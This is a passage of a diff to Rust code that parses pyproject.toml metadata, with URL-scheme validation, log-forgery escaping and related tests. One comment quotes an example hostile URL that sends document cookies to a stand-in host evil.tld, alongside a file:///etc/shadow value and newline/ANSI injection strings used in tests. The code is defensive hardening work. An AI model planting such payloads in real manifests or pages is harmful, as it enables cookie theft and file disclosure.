@@ -7,14 +7,11 @@
 //!
 //! Parse and read errors fall back to defaults; non-NotFound read errors and
 //! parse errors are reported via `tracing` (`debug!` / `warn!`) so a malformed
-//! manifest does not silently look like a missing one (TASK-0394).
+//! manifest does not silently look like a missing one.
 
-// READ-10 / TASK-1761: `unwrap_used` only — the test modules `.unwrap()`
-// tempdir / serde results throughout, and a `Result`-returning test would
-// bury the assertion. The crate performs no numeric conversion of any kind,
-// so the `cast_*` allows that used to sit here were pre-authorisation for
-// casts nobody had reviewed; `docs/clippy.md` requires the narrowest scope
-// that works.
+// `unwrap_used` only: the test modules `.unwrap()` tempdir / serde results
+// throughout, and a `Result`-returning test would bury the assertion. Nothing
+// wider is allowed — `docs/clippy.md` requires the narrowest scope that works.
 #![cfg_attr(test, allow(clippy::unwrap_used))]
 
 mod units;
@@ -22,11 +19,9 @@ mod units;
 use std::path::Path;
 
 use ops_about::identity::{provide_identity_from_manifest, ParsedManifest};
-// DUP-3 / TASK-1258: route through the shared
-// [`ops_about::text_util::trim_nonempty`] so the about-python and about-node
-// ERR-2 contracts are pinned at the same source location.
-// DUP-3 / TASK-1758: same reasoning for `contains_control_chars`, and
-// SEC-11 / TASK-1755 for the `has_allowed_url_scheme` allowlist.
+// The trim, control-character and URL-scheme policies are shared with the
+// Node provider through `ops_about::text_util`, so both stacks are pinned to
+// one definition of each rather than to copies that can drift.
 use ops_about::text_util::{contains_control_chars, has_allowed_url_scheme, trim_nonempty};
 use ops_core::project_identity::{base_about_fields, insert_homepage_field, AboutFieldDef};
 use ops_extension::{Context, DataProvider, DataProviderError, ExtensionType};
@@ -71,10 +66,9 @@ impl DataProvider for PythonIdentityProvider {
     }
 
     fn provide(&self, ctx: &mut Context) -> Result<serde_json::Value, DataProviderError> {
-        // DUP-1 (TASK-0484): proof-of-concept of `provide_identity_from_manifest`
-        // — the parse-once / build-identity scaffold lives in `ops_about`,
-        // and the Python provider only needs to project pyproject.toml onto
-        // a [`ParsedManifest`].
+        // The parse-once / build-identity scaffold lives in `ops_about`;
+        // this provider only projects pyproject.toml onto a
+        // [`ParsedManifest`].
         provide_identity_from_manifest(ctx.working_directory(), |root| {
             let Pyproject {
                 name,
@@ -88,11 +82,21 @@ impl DataProvider for PythonIdentityProvider {
                 has_tool_uv,
             } = parse_pyproject(root).unwrap_or_default();
 
-            // SEC-25 (mirrors extensions-node/about/src/package_manager.rs::probe):
-            // use symlink_metadata so a hostile uv.lock symlink isn't followed
-            // to an arbitrary target during workspace probing.
+            // `symlink_metadata`, as in the Node provider's lockfile probe,
+            // so a hostile `uv.lock` symlink is not followed to an arbitrary
+            // target during workspace probing.
             let uses_uv = std::fs::symlink_metadata(root.join("uv.lock")).is_ok() || has_tool_uv;
             let stack_detail = build_stack_detail(requires_python.as_deref(), uses_uv);
+
+            // The packages row carries the same count the units provider
+            // lists — one per resolved `[tool.uv.workspace]` member — read
+            // through the shared manifest cache, so the card and the
+            // workspace table cannot drift. A single-package project (no
+            // workspace table, or member globs matching nothing) keeps
+            // `None`: a label with no value renders a blank row, and "1"
+            // would say nothing.
+            let workspace_members = units::read_workspace_members(root);
+            let module_count = (!workspace_members.is_empty()).then_some(workspace_members.len());
 
             ParsedManifest::build(|m| {
                 m.name = name;
@@ -105,7 +109,7 @@ impl DataProvider for PythonIdentityProvider {
                 m.stack_label = "Python";
                 m.stack_detail = stack_detail;
                 m.module_label = "packages";
-                m.module_count = None;
+                m.module_count = module_count;
             })
         })
     }
@@ -137,17 +141,16 @@ struct Pyproject {
     has_tool_uv: bool,
 }
 
-/// PATTERN-1 / TASK-1774: `[project]` is held as an untyped `toml::Table` and
-/// each key is projected onto its own shape by [`project_field`], instead of
-/// being deserialised into one all-or-nothing struct.
+/// `[project]` is held as an untyped `toml::Table` and each key is projected
+/// onto its own shape by [`project_field`], rather than deserialised into one
+/// all-or-nothing struct.
 ///
 /// `Option<T>` on a struct field models *absence*, never a *type mismatch*, so
-/// the previous shape aborted the whole deserialisation on any single bad key.
-/// A manifest carrying `authors = ["Alice <a@x.com>"]` — the Poetry
-/// `[tool.poetry]` spelling, which authors migrating to PEP 621 routinely
-/// carry over — is well-formed TOML and mostly valid PEP 621, yet it collapsed
-/// the entire identity to the directory-name fallback with no version, no
-/// license, no description and no URLs, even though `name` and `version` sat
+/// a single struct would abort the whole deserialisation on one bad key. A
+/// manifest carrying `authors = ["Alice <a@x.com>"]` — the Poetry
+/// `[tool.poetry]` spelling that authors migrating to PEP 621 routinely carry
+/// over — is well-formed TOML and mostly valid PEP 621, and must not collapse
+/// the identity to the directory-name fallback while `name` and `version` sit
 /// well-formed in the same table.
 #[derive(Debug, Deserialize)]
 struct RawPyproject {
@@ -156,10 +159,8 @@ struct RawPyproject {
 }
 
 /// Deserialise one `[project]` key, degrading that key alone on a type
-/// mismatch.
-///
-/// PATTERN-1 / TASK-1774: a failure warns with the offending field path and
-/// yields `None`, so every other key still populates the identity.
+/// mismatch: a failure warns with the offending field path and yields `None`,
+/// so every other key still populates the identity.
 fn project_field<T>(project: &toml::Table, key: &str, manifest_path: &Path) -> Option<T>
 where
     T: for<'de> Deserialize<'de>,
@@ -168,9 +169,8 @@ where
     match T::deserialize(value.clone()) {
         Ok(parsed) => Some(parsed),
         Err(e) => {
-            // ERR-7 / TASK-0974: Debug-format the path so embedded newlines /
-            // ANSI in an attacker-controlled checkout path cannot forge log
-            // records.
+            // Debug-format the path so embedded newlines / ANSI in an
+            // attacker-controlled checkout path cannot forge log records.
             tracing::warn!(
                 path = ?manifest_path.display(),
                 field = %format!("project.{key}"),
@@ -201,8 +201,8 @@ struct RawAuthor {
 
 /// One entry of `[project].authors`.
 ///
-/// PATTERN-1 / TASK-1774: PEP 621 specifies the `{ name, email }` table form,
-/// but the bare-string form (`authors = ["Alice <a@x.com>"]`) is what Poetry
+/// PEP 621 specifies the `{ name, email }` table form, but the bare-string
+/// form (`authors = ["Alice <a@x.com>"]`) is what Poetry
 /// uses and is common in the wild. Accepting both — and tolerating anything
 /// else as a skipped entry rather than a hard deserialisation failure — keeps
 /// one odd author from discarding the rest of `[project]`.
@@ -214,31 +214,43 @@ enum RawAuthorEntry {
     Unsupported(toml::Value),
 }
 
+/// One entry of `[project.urls]`.
+///
+/// PEP 621 specifies string values, but nothing stops tooling drift or hand edits from emitting a nested table
+/// (`Funding = { url = "..." }`) or another non-string shape. Degrading
+/// per-entry — mirroring `RawAuthorEntry` — keeps one odd value from failing
+/// the whole map and discarding both `homepage` and `repository`.
+#[derive(Debug, Deserialize)]
+#[serde(untagged)]
+enum RawUrlEntry {
+    Url(String),
+    Unsupported(toml::Value),
+}
+
 #[derive(Debug, Deserialize)]
 struct RawTool {
-    // PERF-3 / TASK-0569: only presence of `[tool.uv]` matters here. Using
-    // `serde::de::IgnoredAny` skips the entire subtree (often holding
-    // dev-dependencies, sources, indexes) instead of materialising it into
-    // an arbitrary `toml::Value` that is immediately thrown away.
+    // Only the presence of `[tool.uv]` matters, so `serde::de::IgnoredAny`
+    // skips the entire subtree — often dev-dependencies, sources and indexes
+    // — instead of materialising a `toml::Value` that is thrown away.
     uv: Option<serde::de::IgnoredAny>,
 }
 
+/// Read and project the root `pyproject.toml` onto [`Pyproject`], or `None`
+/// when it is absent or unparseable.
 fn parse_pyproject(project_root: &Path) -> Option<Pyproject> {
-    // DUP-3 / TASK-0816: read+parse pyproject.toml at most once per project
-    // root for the lifetime of the process; the units provider deserialises
-    // its own shape from the same shared `toml::Value`.
-    // PERF-3 / TASK-0854: read directly from the cached raw text and let
-    // toml::from_str project straight into RawPyproject — avoids the prior
-    // `(*value).clone().try_into()` which materialised a fresh 2-10 KB
-    // toml::Value tree per provider call.
+    // `pyproject.toml` is read at most once per project root for the lifetime
+    // of the process; the units provider deserialises its own shape from the
+    // same cached text. Projecting straight from that text with
+    // `toml::from_str` keeps each provider call from materialising a fresh
+    // 2-10 KB `toml::Value` tree.
     let text = ops_about::manifest_cache::for_filename("pyproject.toml").read(project_root)?;
     let raw: RawPyproject = match toml::from_str(&text) {
         Ok(r) => r,
         Err(e) => {
-            // ERR-7 / TASK-0974: include the manifest path so multi-root
-            // `ops about` runs can attribute the parse failure. Debug-format
-            // the path so embedded newlines / ANSI in attacker-controlled
-            // checkout paths cannot forge log lines.
+            // The manifest path is included so a multi-root `ops about` run
+            // can attribute the failure, and Debug-formatted so embedded
+            // newlines / ANSI in an attacker-controlled checkout path cannot
+            // forge log lines.
             tracing::warn!(
                 path = ?project_root.join("pyproject.toml").display(),
                 error = %e,
@@ -275,11 +287,12 @@ fn parse_pyproject(project_root: &Path) -> Option<Pyproject> {
                 .unwrap_or_default(),
             &manifest_path,
         );
-        if let Some(urls) = project_field::<std::collections::BTreeMap<String, String>>(
+        if let Some(urls) = project_field::<std::collections::BTreeMap<String, RawUrlEntry>>(
             &project,
             "urls",
             &manifest_path,
         ) {
+            let urls = filter_url_entries(urls, &manifest_path);
             let (homepage, repository) = extract_urls(&urls);
             out.homepage = homepage;
             out.repository = repository;
@@ -293,26 +306,25 @@ fn parse_pyproject(project_root: &Path) -> Option<Pyproject> {
 /// The file form is a *path* to a file, not an SPDX identifier, so passing it
 /// through as the license name is misleading. When only `file` is set, surface
 /// it explicitly as `License file: <name>` so the About card communicates that
-/// an SPDX identifier was not declared but a license file is present.
-/// ERR-2 / TASK-0704: trim+drop-empty for license text so a whitespace-only
-/// field does not render as a blank bullet.
+/// an SPDX identifier was not declared but a license file is present. License
+/// text is trimmed and dropped when empty, so a whitespace-only field does not
+/// render as a blank bullet.
 fn normalize_license(license: LicenseField) -> Option<String> {
     match license {
         LicenseField::Text(s) => trim_nonempty(Some(s)),
-        // PATTERN-1 / TASK-1759: try the arms in *value* order, not field
-        // order. Matching on `text: Some(_)` first let a whitespace-only
-        // `text` claim the match and return `None`, so the `file` arm was
-        // unreachable for `{ text = "  ", file = "LICENSE" }` — a shape any
-        // generator that emits every PEP 621 key produces — and the About
-        // card showed no license although the manifest declared one.
+        // The arms are tried in *value* order, not field order: matching on
+        // `text: Some(_)` first would let a whitespace-only `text` claim the
+        // match and return `None`, making the `file` arm unreachable for
+        // `{ text = "  ", file = "LICENSE" }` — a shape any generator that
+        // emits every PEP 621 key produces.
         LicenseField::Table { text, file } => trim_nonempty(text)
             .or_else(|| trim_nonempty(file).map(|f| format!("License file: {f}"))),
     }
 }
 
-/// ERR-2 / TASK-0704: trim+drop-empty for each author component so a
-/// whitespace-only field does not render as a blank bullet — matching
-/// package.json's `format_person`.
+/// Render `[project].authors` entries as display lines. Each component is
+/// trimmed and dropped when empty, so a whitespace-only field does not render
+/// as a blank bullet — matching `package.json`'s `format_person`.
 fn format_authors(authors: Vec<RawAuthorEntry>, manifest_path: &Path) -> Vec<String> {
     authors
         .into_iter()
@@ -323,18 +335,18 @@ fn format_authors(authors: Vec<RawAuthorEntry>, manifest_path: &Path) -> Vec<Str
                 match (name, email) {
                     (Some(n), Some(e)) => Some(format!("{n} <{e}>")),
                     (Some(n), None) => Some(n),
-                    // ERR-2 / TASK-0980: render the email-only case as
-                    // `<email>` to match `extensions-node/about::format_person`
-                    // — both providers feed the same About card schema and a
-                    // bare email next to "Name <email>" entries renders
-                    // inconsistently in a multi-author list.
+                    // The email-only case renders as `<email>`, matching
+                    // `extensions-node/about::format_person`: both providers
+                    // feed the same About card schema, and a bare email next
+                    // to "Name <email>" entries reads inconsistently in a
+                    // multi-author list.
                     (None, Some(e)) => Some(format!("<{e}>")),
                     (None, None) => None,
                 }
             }
-            // PATTERN-1 / TASK-1774: the Poetry-style bare string is already
-            // in the rendered `Name <email>` shape, so pass it through after
-            // the same ERR-2 trim+drop.
+            // The Poetry-style bare string is already in the rendered
+            // `Name <email>` shape, so it passes through after the same
+            // trim-and-drop.
             RawAuthorEntry::Name(s) => trim_nonempty(Some(s)),
             RawAuthorEntry::Unsupported(value) => {
                 tracing::warn!(
@@ -350,16 +362,47 @@ fn format_authors(authors: Vec<RawAuthorEntry>, manifest_path: &Path) -> Vec<Str
         .collect()
 }
 
+/// Degrade the `[project.urls]` table per-entry. A non-string value (e.g. the nested `Funding = { url = ... }` shape PEP 621
+/// tooling drift produces) warns with the offending key and is skipped, so
+/// the string-valued siblings still populate the About card — the same
+/// per-entry recovery `RawAuthorEntry::Unsupported` gives `authors`.
+fn filter_url_entries(
+    entries: std::collections::BTreeMap<String, RawUrlEntry>,
+    manifest_path: &Path,
+) -> std::collections::BTreeMap<String, String> {
+    let mut out = std::collections::BTreeMap::new();
+    for (key, entry) in entries {
+        match entry {
+            RawUrlEntry::Url(url) => {
+                out.insert(key, url);
+            }
+            RawUrlEntry::Unsupported(value) => {
+                // The key derives from verbatim `pyproject.toml` text, so it
+                // is Debug-formatted — the same policy as the
+                // `normalize_urls` collision warn — to keep embedded newlines
+                // / ANSI from forging log records.
+                tracing::warn!(
+                    path = ?manifest_path.display(),
+                    field = "project.urls",
+                    key = ?key,
+                    kind = value.type_str(),
+                    recovery = "skip-entry",
+                    "unsupported [project.urls] value; keeping string-valued siblings"
+                );
+            }
+        }
+    }
+    out
+}
+
 fn extract_urls(
     urls: &std::collections::BTreeMap<String, String>,
 ) -> (Option<String>, Option<String>) {
-    // PERF-3 / TASK-0991: normalise each URL key exactly once per About
-    // call. Previously `pick_url` built a fresh `Vec<(String, &String)>`
-    // and re-ran `normalize_url_key` over every key on each invocation;
-    // `extract_urls` calls `pick_url` twice, so the work was duplicated.
+    // Each URL key is normalised exactly once per About call, and both
+    // `pick_url` calls below read the result.
     let normalized = normalize_urls(urls);
-    // PATTERN-1 / TASK-1062: PEP 621 distinguishes `Homepage` from
-    // `Documentation` as separate, semantically distinct labels. Folding
+    // PEP 621 distinguishes `Homepage` from `Documentation` as separate,
+    // semantically distinct labels. Folding
     // `documentation` into the homepage slot misrepresents a docs-only
     // pyproject as having its docs URL as the homepage, and silently
     // discards Documentation when both are present. Drop it from the
@@ -385,27 +428,21 @@ fn extract_urls(
 /// wild). Look up candidates case-insensitively after trimming, and accept the
 /// kebab-case variant as equivalent to the space-separated form. Callers should
 /// pass the canonical kebab/space form for each variant — "home-page" and
-/// "home page" normalise identically, so passing both is dead weight.
-/// PERF-3 / TASK-0991: shared normalisation pass — once per About call,
-/// rather than once per `pick_url` candidate-set.
+/// "home page" normalise identically, so passing both is dead weight. The
+/// normalisation runs once per About call rather than once per `pick_url`
+/// candidate set.
 ///
-/// PATTERN-1 / TASK-1110: PEP 621 places no constraints on key casing or
-/// punctuation. Two source keys can collapse under `normalize_url_key` —
-/// e.g. `"Homepage"` and `"home page"`, or `"Source-Code"` and
-/// `"source code"`. A naive `.collect()` into a `HashMap` would silently
-/// keep an arbitrary winner (last-write-wins by `BTreeMap` iteration order)
-/// and discard the other URL with no diagnostic. Walk the map explicitly,
-/// keep the first-seen entry, and emit a `tracing::warn!` naming both
-/// raw keys and both URLs so the operator sees the schema drift instead
-/// of a silently dropped URL. Same finding class as TASK-1019 / TASK-1100.
+/// Two source keys can collapse under `normalize_url_key` — `"Homepage"` and
+/// `"home page"`, or `"Source-Code"` and `"source code"`. Collecting into a
+/// map would keep an arbitrary winner and discard the other URL with no
+/// diagnostic, so the map is walked explicitly: the first-seen entry wins and
+/// a `tracing::warn!` names both raw keys and both URLs, making the schema
+/// drift visible instead of silently dropping a URL.
 ///
-/// PERF-3 / TASK-1769: one map keyed by the normalised key, holding the
-/// first-seen `(raw_key, url)` pair. The previous shape kept a second
-/// same-sized `first_seen_raw` map read on exactly one line — the collision
-/// warn — which forced a `norm.clone()` per key and needed a `map_or("")`
-/// fallback for a key that is structurally guaranteed to be present. Holding
-/// both halves in one entry makes that invariant structural rather than
-/// something two containers must keep in lockstep.
+/// The result is one map keyed by the normalised key, each entry holding the
+/// first-seen `(raw_key, url)` pair — keeping the raw key beside its URL makes
+/// "the collision warn always has a first key to name" structural rather than
+/// an invariant two parallel containers must maintain.
 fn normalize_urls(
     urls: &std::collections::BTreeMap<String, String>,
 ) -> std::collections::HashMap<String, (&String, &String)> {
@@ -414,10 +451,10 @@ fn normalize_urls(
     for (k, v) in urls {
         let norm = normalize_url_key(k);
         if let Some((first_key, first_url)) = out.get(&norm) {
-            // SEC-21: every field here derives from verbatim
-            // `pyproject.toml` text — an untrusted key or URL carrying a
-            // newline or an SGR sequence could otherwise forge a log record.
-            // Debug-format them all so they arrive quoted and escaped.
+            // Every field here derives from verbatim `pyproject.toml` text
+            // — an untrusted key or URL carrying a newline or an SGR sequence
+            // could otherwise forge a log record. Debug-format them all so
+            // they arrive quoted and escaped.
             // `normalized_key` is no exception: `normalize_url_key` only
             // trims the *ends*, lowercases, and maps `-` to a space, so an
             // interior newline or ESC survives normalisation untouched and
@@ -446,30 +483,21 @@ fn pick_url(
         let target_norm = normalize_url_key(target);
         normalized.get(&target_norm).map(|(_, v)| (*v).clone())
     });
-    // DUP-3 / TASK-1258: route through the shared trim+drop helper rather
-    // than reimplement the chain inline. TASK-0964 / ERR-2 / TASK-0704
-    // semantics are preserved: a whitespace-only URL renders as "no
-    // homepage" instead of an empty About bullet.
+    // The shared trim-and-drop helper keeps a whitespace-only URL rendering
+    // as "no homepage" rather than an empty About bullet.
     //
-    // SEC-2 / TASK-1207: any control byte (C0 / DEL / Unicode `is_control`)
-    // drops the field entirely, mirroring the SEC-2 / TASK-1165 policy in
-    // `extensions-node/about::repo_url::normalize_repo_url`. Stripping would
-    // silently concatenate the attacker-controlled tail
-    // (`https://demo.dev\nINJECT` → `https://demo.devINJECT`) into a
-    // clickable URL; dropping surfaces the field as missing.
-    //
-    // SEC-11 / TASK-1755: the value must additionally carry an allowlisted
-    // scheme (`https://` / `http://`, see
-    // [`ops_about::text_util::has_allowed_url_scheme`]). `pyproject.toml` is
-    // untrusted input, and without the allowlist a
+    // Beyond that, `pyproject.toml` is untrusted input and the value ends up
+    // as a clickable link in the About card, `ops about --json`, and every
+    // markdown / HTML surface downstream. Any control byte (C0 / DEL /
+    // Unicode `is_control`) drops the field, because stripping would silently
+    // concatenate the attacker-controlled tail
+    // (`https://demo.dev\nINJECT` → `https://demo.devINJECT`) into a working
+    // URL. The scheme must then be in the `http(s)` allowlist, so a
     // `Homepage = "javascript:fetch('https://evil.tld/?c='+document.cookie)"`
-    // or `Repository = "file:///etc/shadow"` flowed verbatim into the About
-    // card, `ops about --json`, and every markdown / HTML surface downstream
-    // of them. Rejection drops the field to `None`, the same drop-not-strip
-    // policy SEC-2 / TASK-1207 applies to control characters, rather than
-    // emitting a partial URL. Scheme-less values are rejected rather than
-    // guessed at. Sibling policy: SEC-11 / TASK-1722 in
-    // `extensions-node/about::repo_url::normalize_repo_url`.
+    // or `Repository = "file:///etc/shadow"` never reaches those surfaces;
+    // scheme-less values are rejected rather than guessed at. Both rejections
+    // drop the field rather than emit a partial URL — the same policy
+    // `extensions-node/about::repo_url::normalize_repo_url` applies.
     trim_nonempty(raw)
         .filter(|s| !contains_control_chars(s))
         .filter(|s| has_allowed_url_scheme(s))
@@ -485,11 +513,11 @@ mod tests {
     use ops_about::test_support::capture_tracing;
     use ops_core::project_identity::ProjectIdentity;
 
-    /// DUP-1 / TASK-1763: sixteen tests in this module opened with the same
-    /// five-statement tempdir / write / `test_context` / deserialise preamble,
-    /// which buried the one line per test that states the contract and made
-    /// every `provide` signature change a sixteen-site edit. The two shapes
-    /// below carry that preamble once.
+    /// Write a `pyproject.toml` into a fresh tempdir and run the identity
+    /// provider over it. The tempdir / write / `test_context` / deserialise
+    /// preamble lives here once, so each test below is the one line that
+    /// states its contract and a `provide` signature change is a single
+    /// edit.
     fn identity_from(pyproject: &str) -> ProjectIdentity {
         identity_from_with_files(pyproject, &[])
     }
@@ -514,10 +542,9 @@ mod tests {
         serde_json::from_value(provider.provide(&mut ctx).unwrap()).unwrap()
     }
 
-    /// ERR-7 (TASK-0818): manifest paths flow through `tracing::warn!` via
-    /// the `?` formatter so embedded newlines or ANSI escapes cannot forge
-    /// multi-line log records. DUP-3 / TASK-0985: shared helper — see
-    /// `ops_about::test_support`.
+    /// Manifest paths reach `tracing::warn!` through the `?` formatter, so
+    /// embedded newlines or ANSI escapes cannot forge multi-line log
+    /// records.
     #[test]
     fn pyproject_path_debug_escapes_control_characters() {
         let p = Path::new("a\nb\u{1b}[31mc/pyproject.toml");
@@ -647,6 +674,55 @@ authors = [{ name = "rsvaleri" }]
         assert_eq!(id.license.as_deref(), Some("MIT"));
         assert_eq!(id.authors, vec!["rsvaleri"]);
         assert_eq!(id.module_label, "packages");
+        // A single-package (non-workspace) pyproject keeps
+        // `module_count = None` — the packages row carries no value.
+        assert_eq!(id.module_count, None);
+    }
+
+    /// On one uv-workspace fixture, the identity
+    /// card's `module_count` and the units provider's list must come from the
+    /// same resolved member set, so the packages row and the workspace table
+    /// cannot drift. Asserted together on the same fixture, with a member
+    /// directory that resolves and one that does not (no pyproject.toml), so
+    /// the count follows the *resolved* set rather than the raw glob text.
+    #[test]
+    fn uv_workspace_module_count_equals_the_units_provider_length() {
+        let dir = tempfile::tempdir().unwrap();
+        ops_about::test_support::write_file(
+            &dir.path().join("pyproject.toml"),
+            r#"
+[project]
+name = "root"
+version = "0.0.0"
+
+[tool.uv.workspace]
+members = ["packages/*"]
+"#,
+        );
+        ops_about::test_support::write_file(
+            &dir.path().join("packages/alpha/pyproject.toml"),
+            "[project]\nname = \"alpha\"\nversion = \"1.0.0\"\n",
+        );
+        ops_about::test_support::write_file(
+            &dir.path().join("packages/beta/pyproject.toml"),
+            "[project]\nname = \"beta\"\nversion = \"2.0.0\"\n",
+        );
+        // A directory under the glob with no pyproject.toml resolves to no
+        // unit — and must not be counted.
+        std::fs::create_dir_all(dir.path().join("packages/not-a-pkg")).unwrap();
+
+        let mut ctx = ops_extension::Context::test_context(dir.path().to_path_buf());
+        let identity: ProjectIdentity =
+            serde_json::from_value(PythonIdentityProvider.provide(&mut ctx).unwrap()).unwrap();
+        let units: Vec<ops_core::project_identity::ProjectUnit> =
+            serde_json::from_value(units::PythonUnitsProvider.provide(&mut ctx).unwrap()).unwrap();
+
+        assert_eq!(units.len(), 2, "two members resolve, one does not");
+        assert_eq!(
+            identity.module_count,
+            Some(units.len()),
+            "the packages row must equal the units list length on the same fixture"
+        );
     }
 
     #[test]
@@ -694,10 +770,10 @@ license = { file = "LICENSE" }
         assert_eq!(id.license.as_deref(), Some("License file: LICENSE"));
     }
 
-    /// PATTERN-1 / TASK-1759: matching on `text: Some(_)` before the `file`
-    /// arm let a whitespace-only `text` claim the match and drop the license
-    /// entirely, making the `file` arm unreachable for a shape any generator
-    /// that emits every PEP 621 key produces.
+    /// A whitespace-only `text` must not claim the match and drop the
+    /// license: the `file` arm has to stay reachable for
+    /// `{ text = "  ", file = "LICENSE" }`, a shape any generator that emits
+    /// every PEP 621 key produces.
     #[test]
     fn blank_license_text_falls_through_to_the_file_form() {
         let id = identity_from(
@@ -713,7 +789,7 @@ license = { text = "  ", file = "LICENSE" }
     }
 
     /// The fall-through must not resurrect a blank `file` either — both
-    /// whitespace-only still drops the field (ERR-2 / TASK-0704).
+    /// whitespace-only still drops the field.
     #[test]
     fn blank_license_text_and_file_still_drops() {
         let id = identity_from(
@@ -788,9 +864,36 @@ Repository = "https://github.com/x/demo"
         assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
     }
 
-    /// TASK-0964: a whitespace-only URL must drop to None instead of rendering
-    /// as an empty About bullet, matching the trim+drop policy already applied
-    /// to name/license/requires-python/authors.
+    /// A `[project.urls]` table with one non-string value is well-formed
+    /// TOML and must not fail the whole map, taking both homepage and
+    /// repository with it. The string-valued siblings survive and the skipped
+    /// entry warns once, naming its key with a recovery field — the same
+    /// per-entry degradation `RawAuthorEntry::Unsupported` gives `authors`.
+    #[test]
+    fn mixed_value_urls_table_keeps_string_siblings_and_warns_per_entry() {
+        let (id, warn_count) = ops_about::test_support::count_warnings(|| {
+            identity_from(
+                r#"
+[project]
+name = "demo"
+version = "1.0.0"
+
+[project.urls]
+Homepage = "https://demo.dev"
+Repository = "https://github.com/x/demo"
+Funding = { url = "https://sponsor.dev" }
+"#,
+            )
+        });
+
+        assert_eq!(id.homepage.as_deref(), Some("https://demo.dev"));
+        assert_eq!(id.repository.as_deref(), Some("https://github.com/x/demo"));
+        assert_eq!(warn_count, 1);
+    }
+
+    /// A whitespace-only URL drops to `None` instead of rendering as an
+    /// empty About bullet, matching the trim-and-drop policy applied to
+    /// name / license / requires-python / authors.
     #[test]
     fn whitespace_only_url_resolves_to_none() {
         let id = identity_from(
@@ -811,11 +914,10 @@ Homepage = "   "
         );
     }
 
-    /// SEC-2 / TASK-1207: a `[project.urls]` value containing an embedded
-    /// newline must not survive into ProjectIdentity.homepage — sister
-    /// policy to extensions-node/about::strip_control_chars (TASK-1080) and
-    /// the field-drop policy (TASK-1165). Stripping would silently
-    /// concatenate `https://demo.dev\nINJECTED` into a clickable
+    /// A `[project.urls]` value containing an embedded newline must not
+    /// survive into `ProjectIdentity.homepage` — the same drop-not-strip
+    /// policy the Node provider applies to `repository`. Stripping would
+    /// silently concatenate `https://demo.dev\nINJECTED` into a clickable
     /// attacker-named URL; dropping surfaces the field as missing.
     #[test]
     fn homepage_with_embedded_newline_drops_field() {
@@ -837,7 +939,7 @@ Homepage = "https://demo.dev\nINJECTED"
         );
     }
 
-    /// SEC-2 / TASK-1207: a `[project.urls]` Repository value containing an
+    /// A `[project.urls]` Repository value containing an
     /// embedded ANSI escape (U+001B) must not survive — would otherwise
     /// repaint the operator terminal when the About card is rendered.
     #[test]
@@ -860,7 +962,7 @@ Repository = "https://demo.dev\u001b[31mfake"
         );
     }
 
-    /// SEC-11 / TASK-1755: `pyproject.toml` is untrusted input, so a
+    /// `pyproject.toml` is untrusted input, so a
     /// `[project.urls]` value whose scheme is not on the `http(s)` allowlist
     /// must drop the field to `None` rather than reach the About card, the
     /// markdown / HTML surfaces, or `ops about --json` as a clickable
@@ -898,7 +1000,7 @@ Repository = "{hostile}"
         }
     }
 
-    /// SEC-11 / TASK-1755: a scheme-less value is rejected rather than
+    /// A scheme-less value is rejected rather than
     /// guessed at — inventing `https://` would fabricate a link the manifest
     /// never declared. The repository slot has a git-remote fallback, so this
     /// pins the homepage slot where a rejection is directly observable.
@@ -918,7 +1020,7 @@ Homepage = "example.com/x"
         assert!(id.homepage.is_none(), "got: {:?}", id.homepage);
     }
 
-    /// PATTERN-1 / TASK-1062: PEP 621 distinguishes `Homepage` from
+    /// PEP 621 distinguishes `Homepage` from
     /// `Documentation`. A pyproject with only a `Documentation` URL must NOT
     /// have its docs URL surfaced as the project homepage — the homepage
     /// field should fall through to None.
@@ -942,11 +1044,11 @@ Documentation = "https://docs.x"
         );
     }
 
-    /// PATTERN-1 / TASK-1110: two raw keys that collapse under
-    /// `normalize_url_key` must keep the **first-seen** (`BTreeMap`-order)
-    /// entry and warn, rather than letting a naive `.collect()` pick an
-    /// arbitrary last-write-wins winner. TEST-5 / TASK-1757: reverting
-    /// `normalize_urls` to `urls.iter().map(...).collect()` fails this test.
+    /// Two raw keys that collapse under `normalize_url_key` keep the
+    /// **first-seen** (`BTreeMap`-order) entry and warn, rather than letting
+    /// a plain `.collect()` pick an arbitrary last-write-wins winner —
+    /// rewriting `normalize_urls` as `urls.iter().map(...).collect()` fails
+    /// here.
     #[test]
     fn colliding_url_keys_keep_the_first_seen_entry_and_warn() {
         let mut urls = std::collections::BTreeMap::new();
@@ -984,7 +1086,7 @@ Documentation = "https://docs.x"
         );
     }
 
-    /// SEC-21: `normalize_url_key` only trims the *ends* of the key, so an
+    /// `normalize_url_key` only trims the *ends* of the key, so an
     /// interior newline or ESC survives into `norm`. The collision warn must
     /// therefore Debug-format `normalized_key` too — Display-formatting it
     /// would let a hostile `[project.urls]` key forge a log record.
@@ -1013,8 +1115,8 @@ Documentation = "https://docs.x"
         );
     }
 
-    /// TEST-5 / TASK-1757: the same contract end to end, through a real
-    /// manifest rather than a hand-built map.
+    /// The same contract end to end, through a real manifest rather than a
+    /// hand-built map.
     #[test]
     fn colliding_url_keys_in_a_manifest_keep_the_first_seen_homepage() {
         let id = identity_from(
@@ -1042,11 +1144,10 @@ Home-Page = "https://first.dev"
         assert!(id.stack_detail.is_none());
     }
 
-    /// TEST-5 / TASK-1756: the crate doc promises that a *malformed* manifest
-    /// falls back to defaults *and* says so via `tracing::warn!`, so a broken
-    /// manifest does not silently look like a missing one (TASK-0394 /
-    /// TASK-0974). Both halves were previously unasserted — deleting the warn
-    /// left the suite green.
+    /// The crate doc promises that a *malformed* manifest falls back to
+    /// defaults *and* says so via `tracing::warn!`, so a broken manifest does
+    /// not silently look like a missing one. Both halves are asserted here,
+    /// so deleting the warn fails the suite.
     #[test]
     fn invalid_pyproject_falls_back_to_directory_name_and_warns() {
         let dir = tempfile::tempdir().unwrap();
@@ -1072,7 +1173,7 @@ Home-Page = "https://first.dev"
         );
     }
 
-    /// PATTERN-1 / TASK-1774: `authors` written as a list of bare strings is
+    /// `authors` written as a list of bare strings is
     /// the Poetry spelling and is common in the wild. It must not discard the
     /// rest of `[project]`, and the entries themselves are already in the
     /// rendered `Name <email>` shape.
@@ -1094,7 +1195,7 @@ authors = ["Alice <a@x.com>", "Bob"]
         assert_eq!(id.authors, vec!["Alice <a@x.com>", "Bob"]);
     }
 
-    /// PATTERN-1 / TASK-1774: a type mismatch on one `[project]` key must
+    /// A type mismatch on one `[project]` key must
     /// degrade that key alone — every other field still populates — and the
     /// failure must be visible in a warn naming the offending field path.
     #[test]
@@ -1127,7 +1228,7 @@ requires-python = ">=3.11"
         );
     }
 
-    /// PATTERN-1 / TASK-1774: an author entry that is neither the PEP 621
+    /// An author entry that is neither the PEP 621
